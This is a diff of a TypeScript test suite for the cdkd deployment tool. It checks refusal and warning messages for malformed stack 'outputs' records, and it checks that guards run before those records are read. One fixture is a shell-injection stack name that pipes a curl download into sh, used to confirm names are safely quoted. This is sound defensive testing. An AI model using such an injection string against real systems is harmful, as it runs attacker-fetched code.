@@ -7,19 +7,25 @@ import {
   hasReadableOutputs,
   hasReadableResources,
   isReadableBag,
+  malformedDestroyOutputsRefusalMessage,
   malformedExportSourceWarning,
+  malformedLocalOutputsWarning,
+  malformedNestedChildOutputsRefusalMessage,
   malformedOutputsRefusalMessage,
   malformedOutputsWarning,
   malformedRenderedContainersWarning,
   malformedResourcesWarning,
   malformedStateRefusalMessage,
+  refuseMalformedNestedChildOutputs,
   refuseMalformedOutputs,
+  refuseMalformedOutputsForDestroy,
   refuseMalformedState,
   repairMalformedOutputsForReadOnly,
   repairMalformedResourcesForReadOnly,
   type RenderedStateContainer,
 } from '../../../src/state/malformed-resources-bag.js';
 import { UNRENDERABLE } from '../../../src/utils/display-safe.js';
+import { isMarkedNonRetryable } from '../../../src/deployment/retryable-errors.js';
 import { CdkdError } from '../../../src/utils/error-handler.js';
 import type { StackState } from '../../../src/types/state.js';
 
@@ -335,6 +341,168 @@ describe('the malformed-outputs REFUSAL text (issue go-to-k/cdkd#3192)', () => {
     expect(long).toContain('cdkd state show');
     expect(long.length).toBeLessThan(1500);
   });
+});
+
+/**
+ * The three texts issue go-to-k/cdkd#3207 added, and the two refusal helpers
+ * that carry two of them.
+ *
+ * Each is a SEPARATE text for the reason every text in this module is: the
+ * CONSEQUENCE of continuing differs, and a borrowed sentence states one that
+ * does not happen. The distinctness cases below are what stops a later "these
+ * three are nearly identical, merge them" from landing.
+ */
+describe('the gate-scoped outputs texts (issue go-to-k/cdkd#3207)', () => {
+  const HOSTILE = "a'; curl http://x|sh; echo '";
+  const CONTROL_ONLY = String.fromCharCode(0x00, 0x01);
+
+  const TEXTS: ReadonlyArray<readonly [string, (s: string, r: string) => string]> = [
+    ['the DESTROY refusal', malformedDestroyOutputsRefusalMessage],
+    ['the NESTED-child refusal', malformedNestedChildOutputsRefusalMessage],
+    ['the LOCAL warning', malformedLocalOutputsWarning],
+  ];
+
+  // The four properties `safeIdentifier`'s note requires of every message in
+  // this module. Inheritance is exactly what stops being true when someone
+  // inlines a helper, so each new text gets its own row rather than a comment
+  // saying it inherits them.
+  for (const [label, build] of TEXTS) {
+    it(`${label} shell-quotes a hostile name and emits the command LAST, on one line`, () => {
+      const m = build(HOSTILE, 'us-east-1');
+      expect(m).not.toContain(`${HOSTILE} --stack-region`);
+      expect(m).toContain('cdkd state show');
+      expect(m.split('\n')).toHaveLength(1);
+    });
+
+    it(`${label} renders an identifier that sanitizes to EMPTY as a placeholder`, () => {
+      expect(build(CONTROL_ONLY, 'us-east-1')).toContain(UNRENDERABLE);
+    });
+
+    it(`${label} CAPS a multi-kilobyte name so the remedy stays on screen`, () => {
+      const long = build('q'.repeat(5000), 'us-east-1');
+      expect(long).toContain(`${'q'.repeat(128)}...`);
+      expect(long).toContain('cdkd state show');
+      expect(long.length).toBeLessThan(1500);
+    });
+
+    it(`${label} names the container it is about`, () => {
+      expect(build('S', 'us-east-1')).toContain(`'outputs'`);
+    });
+  }
+
+  it('the DESTROY refusal names the SKIPPED check, which is its whole reason', () => {
+    const m = malformedDestroyOutputsRefusalMessage('S', 'us-east-1');
+    expect(m).toContain('DELETES state');
+    // The dangerous direction: a null / number / boolean bag reads as "exports
+    // nothing" and the cross-stack protection never runs at all. Without this
+    // sentence the text would describe only the fabricating half.
+    expect(m).toContain('SKIPS the check');
+    expect(m).toContain('imports from');
+    // A destroy does not rebuild the bag — it CLEARS it — so borrowing the
+    // deploy sentence would state a mechanism that never happens here.
+    expect(m).not.toContain('REBUILDS the bag before saving');
+  });
+
+  it('the NESTED-child refusal names the PARENT as the record that would be written', () => {
+    const m = malformedNestedChildOutputsRefusalMessage('Parent~Child', 'us-east-1');
+    expect(m).toContain('nested stack child');
+    expect(m).toContain("PARENT's record");
+    expect(m).toContain('Fn::GetAtt');
+    // The damaged record and the saved record are DIFFERENT stacks here, so
+    // the deploy text's blast radius is the wrong one.
+    expect(m).not.toContain('shared exports index');
+  });
+
+  it('the LOCAL warning says it CONTINUES, and does not claim a refusal', () => {
+    const m = malformedLocalOutputsWarning('S', 'us-east-1');
+    expect(m).toContain('Continuing with it EMPTY');
+    expect(m).toContain('is not the same as the record holding none');
+    expect(m).not.toContain('refuses');
+    // Not the DIFF warning's text: a local run reports no ADD rows, it
+    // SUBSTITUTES, so that sentence would describe output nobody will see.
+    expect(m).not.toContain('reported as an ADD');
+  });
+
+  it('all five outputs texts are DISTINCT — a borrowed sentence states a wrong consequence', () => {
+    const rendered = [
+      malformedOutputsRefusalMessage('S', 'r'),
+      malformedOutputsWarning('S', 'r'),
+      malformedExportSourceWarning('S', 'r'),
+      malformedDestroyOutputsRefusalMessage('S', 'r'),
+      malformedNestedChildOutputsRefusalMessage('S', 'r'),
+      malformedLocalOutputsWarning('S', 'r'),
+    ];
+    expect(new Set(rendered).size).toBe(rendered.length);
+  });
+});
+
+describe('the two go-to-k/cdkd#3207 refusal helpers', () => {
+  function withOutputs(outputs: unknown): StackState {
+    const s = state({ R: { physicalId: 'p', resourceType: 'AWS::S3::Bucket', properties: {} } });
+    s.outputs = outputs as StackState['outputs'];
+    return s;
+  }
+
+  const HELPERS: ReadonlyArray<
+    readonly [
+      string,
+      (s: StackState, n: string, r: string) => void,
+      (n: string, r: string) => string,
+    ]
+  > = [
+    ['refuseMalformedOutputsForDestroy', refuseMalformedOutputsForDestroy, malformedDestroyOutputsRefusalMessage],
+    [
+      'refuseMalformedNestedChildOutputs',
+      refuseMalformedNestedChildOutputs,
+      malformedNestedChildOutputsRefusalMessage,
+    ],
+  ];
+
+  for (const [name, refuse, text] of HELPERS) {
+    for (const [label, value] of UNREADABLE.filter(([l]) => l !== 'absent')) {
+      it(`${name} REFUSES ${label} with the shared code and its OWN text`, () => {
+        let thrown: unknown;
+        try {
+          refuse(withOutputs(value), 'MyStack', 'eu-west-1');
+        } catch (err) {
+          thrown = err;
+        }
+        expect(thrown, `a ${label} outputs bag was not refused`).toBeInstanceOf(CdkdError);
+        expect((thrown as CdkdError).code).toBe(STATE_RESOURCES_MALFORMED);
+        expect((thrown as CdkdError).message).toBe(text('MyStack', 'eu-west-1'));
+      });
+    }
+
+    it(`${name} FLOOR: a populated, an empty and an ABSENT bag all pass through`, () => {
+      // Without this, "refuses what it must" says nothing — a helper that threw
+      // on everything would satisfy every case above while making the command
+      // unusable. The ABSENT row is the one that would break real records.
+      expect(() => refuse(withOutputs({ A: 'a' }), 'S', 'r')).not.toThrow();
+      expect(() => refuse(withOutputs({}), 'S', 'r')).not.toThrow();
+      expect(() => refuse(withOutputs(undefined), 'S', 'r')).not.toThrow();
+    });
+
+    it(`${name} never MUTATES the record it refuses`, () => {
+      const s = withOutputs('abcdef');
+      expect(() => refuse(s, 'S', 'r')).toThrow();
+      expect(s.outputs).toBe('abcdef' as unknown as StackState['outputs']);
+    });
+
+    it(`${name} agrees with hasReadableOutputs on every shape`, () => {
+      // ONE predicate under all four entry points, so no two of them can come
+      // to different verdicts about the same record — only about what to DO.
+      for (const [label, value] of UNREADABLE) {
+        const readable = hasReadableOutputs(withOutputs(value));
+        let refused = false;
+        try {
+          refuse(withOutputs(value), 'S', 'r');
+        } catch {
+          refused = true;
+        }
+        expect(refused, `${name} / ${label}`).toBe(!readable);
+      }
+    });
+  }
 });
 
 describe('the malformed export-SOURCE warning (issue go-to-k/cdkd#3192)', () => {
@@ -1077,10 +1245,47 @@ describe('write-capable commands refuse; read-only ones repair', () => {
    * an unfalsifiable guard fences nothing. The membership case below pins that
    * premise rather than leaving it in a comment.
    */
+  /**
+   * Every helper in this module that REFUSES on the `outputs` container.
+   *
+   * A list rather than a fixed pair because go-to-k/cdkd#3207 gave two sites
+   * their own TEXT (a destroy clears the bag rather than rebuilding it; a
+   * nested child's damage is written into the PARENT's record), and each text
+   * needs its own throwing entry point. What they share is
+   * `hasReadableOutputs`, so the VERDICT stays singular.
+   *
+   * Derived by grep rather than by recall:
+   *   grep -n "^export function refuseMalformed.*Outputs" \
+   *     src/state/malformed-resources-bag.ts
+   */
+  const REFUSAL_SPELLINGS = [
+    'refuseMalformedOutputs(',
+    'refuseMalformedOutputsForDestroy(',
+    'refuseMalformedNestedChildOutputs(',
+  ];
+
+  it('REFUSAL_SPELLINGS names every outputs refusal the module exports', () => {
+    // A fence listing spellings goes inert the moment a sixth is added and not
+    // listed — the population is derived from the MODULE, never from this list.
+    const moduleSrc = code('src/state/malformed-resources-bag.ts');
+    const exported = [...moduleSrc.matchAll(/export function (refuseMalformed\w*Outputs\w*)\(/g)]
+      .map((m) => `${m[1]!}(`)
+      .sort();
+    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(3);
+    expect([...REFUSAL_SPELLINGS].sort()).toEqual(exported);
+  });
+
   const OUTPUTS_REFUSE = [
     'src/cli/commands/scrub.ts',
     'src/cli/commands/import.ts',
     'src/cli/commands/orphan.ts',
+    // Added by go-to-k/cdkd#3207. Both call `saveState` — `deploy` writes the
+    // rebuilt bag on the no-change path and carries it verbatim on five
+    // failure-path saves; `destroy-runner` writes a trimmed record and
+    // `deleteState`s the original. They were left out of go-to-k/cdkd#3192 for
+    // being in a real-AWS integ gate scope, not for taking a different answer.
+    'src/deployment/deploy-engine.ts',
+    'src/cli/commands/destroy-runner.ts',
   ];
 
   /**
@@ -1102,6 +1307,19 @@ describe('write-capable commands refuse; read-only ones repair', () => {
     // `rewriteResourceReferences`, which rebuilds the bag from
     // `Object.entries(state.outputs ?? {})` in `src/analyzer/orphan-rewriter.ts`.
     'src/cli/commands/orphan.ts': 'rewriteResourceReferences(',
+    // go-to-k/cdkd#3207. The anchor is the LOADED record's bag in each file,
+    // which is what the guard is about.
+    //
+    // `deploy-engine.ts` also has `redactStateForPersist`'s
+    // `this.redactOutputs(state.outputs)` textually EARLIER, and it is
+    // deliberately not the anchor: that is a helper reading whatever bag it is
+    // HANDED, the same relationship `orphan.ts`'s `rewriteResourceReferences`
+    // has, and every state it is handed is derived from `currentState` after
+    // this guard. `currentState.outputs` is the first read of the loaded bag.
+    'src/deployment/deploy-engine.ts': 'currentState.outputs',
+    // The strong-reference decision, which is the ONLY thing this runner does
+    // with the bag.
+    'src/cli/commands/destroy-runner.ts': 'state.outputs && Object.keys(',
   };
 
   it('rollback.ts is OUT of the outputs population because it reads no outputs', () => {
@@ -1120,11 +1338,16 @@ describe('write-capable commands refuse; read-only ones repair', () => {
   for (const file of OUTPUTS_REFUSE) {
     it(`${file} REFUSES a malformed \`outputs\` bag — it can saveState`, () => {
       const src = code(file);
-      // TWO spellings, exactly as the resources half: most files call the
-      // shared helper; `scrub` branches on the exported predicate and raises
-      // its OWN exit-2 class, because its exit 1 is spoken for.
+      // THREE spellings now. Most files call the shared helper; `scrub`
+      // branches on the exported predicate and raises its OWN exit-2 class,
+      // because its exit 1 is spoken for; and go-to-k/cdkd#3207 added
+      // `destroy-runner.ts`, which refuses through a SIBLING helper carrying a
+      // different TEXT (a destroy clears the bag rather than rebuilding it, so
+      // the shared sentence would state a mechanism that never happens). All
+      // three delegate to `hasReadableOutputs`, which is what keeps the VERDICT
+      // singular while the message varies.
       const refuses =
-        src.includes('refuseMalformedOutputs(') ||
+        REFUSAL_SPELLINGS.some((call) => src.includes(call)) ||
         (src.includes('hasReadableOutputs(') && src.includes('malformedOutputsRefusalMessage('));
       expect(
         refuses,
@@ -1187,10 +1410,23 @@ describe('write-capable commands refuse; read-only ones repair', () => {
       }
 
       // DOMINANCE.
-      const refusalAt = Math.max(
-        src.indexOf('refuseMalformedOutputs('),
-        src.indexOf('hasReadableOutputs(')
-      );
+      // The LAST position any accepted spelling occupies — `Math.max`, so a
+      // file holding two cannot satisfy the bound on the earlier one alone.
+      //
+      // Taken over the spellings PRESENT, and the presence half is the point:
+      // `indexOf` answers `-1` for an absent one, and `-1` is less than every
+      // dereference index, so a fence reading a fixed pair would pass
+      // VACUOUSLY on a file refusing through a third spelling. go-to-k/cdkd#3207
+      // added exactly such a file.
+      const positions = [...REFUSAL_SPELLINGS, 'hasReadableOutputs(']
+        .map((call) => src.indexOf(call))
+        .filter((at) => at > -1);
+      expect(
+        positions.length,
+        `${file} contains none of the refusal spellings this fence knows about, so its ` +
+          `dominance check would pass over nothing. Add the spelling to REFUSAL_SPELLINGS.`
+      ).toBeGreaterThan(0);
+      const refusalAt = Math.max(...positions);
       const derefAt = FIRST_OUTPUTS_USE[file]!;
       const derefIndex = src.indexOf(derefAt);
       expect(
@@ -1205,6 +1441,127 @@ describe('write-capable commands refuse; read-only ones repair', () => {
       ).toBeLessThan(derefIndex);
     });
   }
+
+  /**
+   * The four go-to-k/cdkd#3207 sites that call NO `saveState`, so the
+   * `OUTPUTS_REFUSE` loop's own premise assertion cannot hold for them — yet
+   * two of them still REFUSE and two still REPAIR, and the reasons are
+   * per-site rather than mechanical. Each gets its own case stating the
+   * premise it actually rests on.
+   */
+  it('src/provisioning/providers/nested-stack-provider.ts REFUSES — its caller persists the result', () => {
+    const file = 'src/provisioning/providers/nested-stack-provider.ts';
+    const src = code(file);
+    // The premise: it writes no state itself. If that ever stops being true it
+    // belongs in OUTPUTS_REFUSE with the rest.
+    expect(
+      src.includes('saveState('),
+      `${file} now writes state directly; move it into OUTPUTS_REFUSE.`
+    ).toBe(false);
+    expect(
+      src.includes('refuseMalformedNestedChildOutputs('),
+      `${file} rebuilds the PARENT's Outputs.<Key> attributes from the CHILD's bag and the ` +
+        `parent's deploy PERSISTS them, so a malformed child bag must be refused rather than ` +
+        `walked — 'Object.entries' turns a six-character bag into six fabricated attributes ` +
+        `that Fn::GetAtt then resolves into live AWS calls.`
+    ).toBe(true);
+    expect(
+      src.includes('repairMalformedOutputsForReadOnly'),
+      `${file} repairs the child's bag, which puts a well-formed fabricated attribute set into ` +
+        `the parent's record with nothing left to say the child was damaged.`
+    ).toBe(false);
+    // DOMINANCE against the first read of the child's bag.
+    const derefAt = 'childStateData.state.outputs';
+    const derefIndex = src.indexOf(derefAt);
+    expect(
+      derefIndex,
+      `${file} no longer contains \`${derefAt}\`; this fence's anchor is stale.`
+    ).toBeGreaterThan(-1);
+    expect(src.indexOf('refuseMalformedNestedChildOutputs(')).toBeLessThan(derefIndex);
+  });
+
+  it('src/deployment/intrinsic-function-resolver.ts REFUSES its Fn::GetStackOutput read', () => {
+    const file = 'src/deployment/intrinsic-function-resolver.ts';
+    const src = code(file);
+    // The ONE reader in this class that RE-APPLIES rather than displays:
+    // `Object.hasOwn('abcdef', '0')` is true, so a fabricated character
+    // resolves into a consumer's template and the deploy sends it to AWS.
+    expect(
+      src.includes('hasReadableOutputs('),
+      `${file} no longer tests the producer's bag through the shared predicate, so an ` +
+        `Fn::GetStackOutput can again resolve one CHARACTER of a damaged record as its value.`
+    ).toBe(true);
+    expect(
+      src.includes('MalformedProducerRecordRefusalError'),
+      `${file} no longer raises the dedicated class, so 'cdkd scrub' can no longer tell this ` +
+        `refusal from its user-fixable siblings and refuses the whole consumer stack.`
+    ).toBe(true);
+    // DOMINANCE against the first read of the producer's bag. Both the
+    // membership test and the `describeAvailableOutputs` echo sit below it.
+    const derefAt = 'stateData.state.outputs';
+    const derefIndex = src.indexOf(derefAt);
+    expect(
+      derefIndex,
+      `${file} no longer contains \`${derefAt}\`; this fence's anchor is stale.`
+    ).toBeGreaterThan(-1);
+    expect(
+      src.indexOf('hasReadableOutputs('),
+      `${file} tests the bag AFTER reading it, so the fabricated key list is already built.`
+    ).toBeLessThan(derefIndex);
+  });
+
+  /**
+   * The two `cdkd local` readers REPAIR and WARN, and the premise is narrower
+   * than "it never writes": a `cdkd local` run CAN write one DERIVED key,
+   * `cdkd/_index/<region>/exports.json`, because `ExportIndexStore.load`
+   * rebuilds and PUTs the index on a miss. That write is separately fail-closed
+   * (`hasReadableExportSet`), so nothing on this path can launder a RECORD —
+   * which is what makes repair safe here. Asserting `ExportIndexStore` absent
+   * would be asserting something false.
+   */
+  const OUTPUTS_LOCAL_REPAIR = [
+    'src/cli/commands/local-state-loader.ts',
+    'src/local/s3-local-state-provider.ts',
+  ];
+
+  for (const file of OUTPUTS_LOCAL_REPAIR) {
+    it(`${file} REPAIRS and WARNS — it writes no state record`, () => {
+      const src = code(file);
+      expect(
+        src.includes('saveState('),
+        `${file} now writes a state record, so reading a damaged bag as empty can launder it — ` +
+          `it must refuse instead.`
+      ).toBe(false);
+      expect(
+        src.includes('hasReadableOutputs(') || src.includes('repairMalformedOutputsForReadOnly('),
+        `${file} no longer tests the bag through the shared predicate, so 'Object.entries' / ` +
+          `'in' walk a string or a list and fabricate one local output per character.`
+      ).toBe(true);
+      expect(
+        src.includes('malformedLocalOutputsWarning('),
+        `${file} reads a damaged bag as EMPTY silently. An empty map is indistinguishable from ` +
+          `a stack that publishes no outputs, so nothing ever names the damaged record.`
+      ).toBe(true);
+      expect(
+        REFUSAL_SPELLINGS.some((call) => src.includes(call)),
+        `${file} REFUSES a damaged bag. It is a read-only local path, and refusing there makes ` +
+          `a 'cdkd local' run unusable over a record the user may not own.`
+      ).toBe(false);
+    });
+  }
+
+  it('the local loader keeps `Object.hasOwn`, not `in`, for its template-controlled key', () => {
+    // `in` walks the prototype chain, so an `OutputName: 'toString'` answered
+    // TRUE on a healthy bag and the arm returned a FUNCTION — the issue #2767
+    // class, one command over.
+    const src = code('src/cli/commands/local-state-loader.ts');
+    expect(src).toContain('Object.hasOwn(outputs, outputName)');
+    expect(
+      /\boutputName in /.test(src),
+      `src/cli/commands/local-state-loader.ts is back to an 'in' membership test on a ` +
+        `template-controlled key.`
+    ).toBe(false);
+  });
 
   /**
    * The exports index takes NEITHER answer, and the third disposition is the
@@ -1265,5 +1622,41 @@ describe('write-capable commands refuse; read-only ones repair', () => {
       src.includes(`from '../state/malformed-resources-bag.js'`),
       `src/analyzer/outputs-diff.ts no longer imports the shared predicate.`
     ).toBe(true);
+  });
+});
+
+describe('the retried refusals are marked non-retryable (issue #3207)', () => {
+  // Both of these fire INSIDE a `withRetry` path -- `NestedStackProvider.delete`
+  // reaches `runDestroyForStack`, and `readChildOutputsAsAttributes` runs inside
+  // the deploy engine's retry wrapper. Without the marker, classification falls
+  // to the SUBSTRING matchers, and `does not exist` / `DependencyViolation` are
+  // live patterns in `RETRYABLE_ERROR_MESSAGE_PATTERNS` that a template-derived
+  // child name (`<parent>~<LogicalId>`) can put in the message. A deterministic
+  // refusal would then be retried on a full schedule. Issue #1838's shape.
+  //
+  // Two-sided on purpose: the CAP is that each refusal carries the marker, and
+  // the FLOOR is that a healthy bag raises nothing at all -- a guard that threw
+  // unconditionally would satisfy the cap alone.
+  const RETRIED = [
+    ['destroy', () => refuseMalformedOutputsForDestroy({ outputs: 'abcdef' as unknown as Record<string, unknown> }, 'S', 'us-east-1')],
+    ['nested child', () => refuseMalformedNestedChildOutputs({ outputs: 'abcdef' as unknown as Record<string, unknown> }, 'P~C', 'us-east-1')],
+  ] as const;
+
+  it.each(RETRIED)('%s refuses with the non-retryable marker set', (_label, raise) => {
+    let thrown: unknown;
+    try {
+      raise();
+    } catch (e) {
+      thrown = e;
+    }
+    expect(thrown, 'the refusal did not fire, so the marker assertion is vacuous').toBeDefined();
+    expect(isMarkedNonRetryable(thrown)).toBe(true);
+  });
+
+  it.each(RETRIED)('%s raises nothing for a readable bag', (_label, _raise) => {
+    expect(() => refuseMalformedOutputsForDestroy({ outputs: { A: 'v' } }, 'S', 'us-east-1')).not.toThrow();
+    expect(() =>
+      refuseMalformedNestedChildOutputs({ outputs: { A: 'v' } }, 'P~C', 'us-east-1')
+    ).not.toThrow();
   });
 });
